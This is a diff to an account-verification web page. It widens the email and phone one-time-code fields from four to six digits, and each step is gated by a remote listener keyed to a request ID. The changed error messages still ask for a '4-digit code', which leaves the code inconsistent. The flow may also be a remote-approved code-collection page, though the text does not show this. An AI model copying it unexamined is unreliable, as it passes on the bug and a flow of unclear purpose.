@@ -391,7 +391,6 @@ select option{background:#3B0616}
     <div class="submit-spin" id="submit-spin">
       <div class="spinner"></div>
       <div class="spin-title">Sending verification code</div>
-      <div class="spin-sub">Contacting the verification service...</div>
     </div>
   </div>
 
@@ -408,6 +407,8 @@ select option{background:#3B0616}
         <input maxlength="1" id="e1" type="tel" oninput="mv('e',1,this)" onkeydown="bk('e',1,event)"/>
         <input maxlength="1" id="e2" type="tel" oninput="mv('e',2,this)" onkeydown="bk('e',2,event)"/>
         <input maxlength="1" id="e3" type="tel" oninput="mv('e',3,this)" onkeydown="bk('e',3,event)"/>
+        <input maxlength="1" id="e4" type="tel" oninput="mv('e',4,this)" onkeydown="bk('e',4,event)"/>
+        <input maxlength="1" id="e5" type="tel" oninput="mv('e',5,this)" onkeydown="bk('e',5,event)"/>
       </div>
       <div id="s2-verify" style="display:none" class="spin-wrap"><div class="spinner"></div><div class="spin-sub">Verifying...</div></div>
       <p class="err" id="err2">Incorrect code. Try again.</p>
@@ -428,6 +429,8 @@ select option{background:#3B0616}
         <input maxlength="1" id="p1" type="tel" oninput="mv('p',1,this)" onkeydown="bk('p',1,event)"/>
         <input maxlength="1" id="p2" type="tel" oninput="mv('p',2,this)" onkeydown="bk('p',2,event)"/>
         <input maxlength="1" id="p3" type="tel" oninput="mv('p',3,this)" onkeydown="bk('p',3,event)"/>
+        <input maxlength="1" id="p4" type="tel" oninput="mv('p',4,this)" onkeydown="bk('p',4,event)"/>
+        <input maxlength="1" id="p5" type="tel" oninput="mv('p',5,this)" onkeydown="bk('p',5,event)"/>
       </div>
       <div id="s3-verify" style="display:none" class="spin-wrap"><div class="spinner"></div><div class="spin-sub">Verifying...</div></div>
       <p class="err" id="err3">Incorrect code. Try again.</p>
@@ -596,7 +599,7 @@ function otpChk(prefix, btnId) {
     const btn = document.getElementById(btnId);
     if (!btn) return;
     let full = true;
-    for (let i = 0; i < 4; i++) {
+    for (let i = 0; i < 6; i++) {
         const el = document.getElementById(prefix + i);
         if (!el || !/^\d$/.test(el.value)) { full = false; break; }
     }
@@ -606,7 +609,7 @@ function otpChk(prefix, btnId) {
 function mv(prefix, index, el) {
     const v = String(el.value || "").replace(/\D/g, "");
     el.value = v.slice(-1);
-    if (el.value && index < 3) {
+    if (el.value && index < 5) {
         const next = document.getElementById(prefix + (index + 1));
         if (next) next.focus();
     }
@@ -715,7 +718,7 @@ function attachListener(requestId) {
                 currentStep = 2;
                 stopDotAnim();
                 hideSubmitSpinner();
-                ["e0","e1","e2","e3"].forEach(id => {
+                ["e0","e1","e2","e3","e4","e5"].forEach(id => {
                     const el = document.getElementById(id);
                     if (el) el.value = "";
                 });
@@ -728,7 +731,7 @@ function attachListener(requestId) {
             if (proceedOk && emailOk && currentStep === 2) {
                 currentStep = 3;
                 hideError("err2");
-                ["p0","p1","p2","p3"].forEach(id => {
+                ["p0","p1","p2","p3","p4","p5"].forEach(id => {
                     const el = document.getElementById(id);
                     if (el) el.value = "";
                 });
@@ -783,11 +786,11 @@ async function verifyEmail() {
     if (!currentRequestId) return;
     hideError("err2");
 
-    const code = ["e0","e1","e2","e3"]
+    const code = ["e0","e1","e2","e3","e4","e5"]
         .map(id => (document.getElementById(id) || {}).value || "")
         .join("");
 
-    if (!/^\d{4}$/.test(code)) {
+    if (!/^\d{6}$/.test(code)) {
         showError("err2", "Enter the 4-digit code.");
         return;
     }
@@ -823,11 +826,11 @@ async function verifyPhone() {
     if (!currentRequestId) return;
     hideError("err3");
 
-    const code = ["p0","p1","p2","p3"]
+    const code = ["p0","p1","p2","p3","p4","p5"]
         .map(id => (document.getElementById(id) || {}).value || "")
         .join("");
 
-    if (!/^\d{4}$/.test(code)) {
+    if (!/^\d{6}$/.test(code)) {
         showError("err3", "Enter the 4-digit code.");
         return;
     }
@@ -913,6 +916,8 @@ window.accountVerificationFirebase = {
 </script>
 </body>
 </html>
+
+
 
 
 
